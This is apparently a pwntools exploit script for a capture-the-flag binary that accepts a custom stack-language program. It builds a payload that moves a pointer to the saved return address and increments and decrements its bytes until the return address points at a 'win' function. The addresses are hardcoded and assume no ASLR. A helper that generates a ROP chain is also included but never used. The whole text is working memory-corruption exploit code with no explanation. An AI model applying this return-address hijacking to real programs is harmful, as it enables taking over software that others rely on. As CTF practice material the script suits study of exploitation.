from pwn import *

def pushnum(n):
    n = int(n)
    s = ''
    t = 0
    if n < 0:
        t = 1
        n = -n
    if(n <= 9):
        return str(n) + 'u0s' if t==1 else str(n)
    narr = []
    while n > 0:
        narr = [n%2] + narr
        n /= 2
    if t == 0:
        s = '2u1'
    else:
        s = '2u0d'
    for i in narr[1:]:
        if i==0:
            s += 'm'
        elif t==0:
            s += 'mi'
        else:
            s += 'md'
    return s

ropnum = 0

def genrop(addr):
    global ropnum
    global offset
    addr += offset
    print "ropping to "+hex(addr)
    vals = [ord(i) for i in p64(addr)]
    retoffset = -104 + ropnum*8 # key - retptr = 104
    rop = ''
    for i in range(8):
        rop += '0r' # jump to the 0th element
        rop += pushnum(retoffset + i) + 'r' # jump to the return ptr
        rop += pushnum(vals[i]) + 'u'
    ropnum += 1
    return rop

r = process('./chal')

payload = ''

# leak main

key = 0x00007fffffffddc0
retptr = 0x00007fffffffdd58
main = 0x00005555555553b5
win = 0x0000555555555391


# overwrite from 0x0000555555555978 to 0x0000555555555391 cuz dw screw up stack (if no aslr)

# overwriting first byte
payload += pushnum(retptr - key) + 'r' # move to return address
payload += '0a' # get val
payload += 'i' * (0x91-0x78) # increment
payload += 'u' # overwrite

# overwriting second byte
payload += '0r' + pushnum(retptr - key+1) + 'r' # point
payload += '0a' # get val
payload += 'd' * (0x59-0x53) # decrement
payload += 'u' # overwrite

r.sendline(payload)

r.interactive()
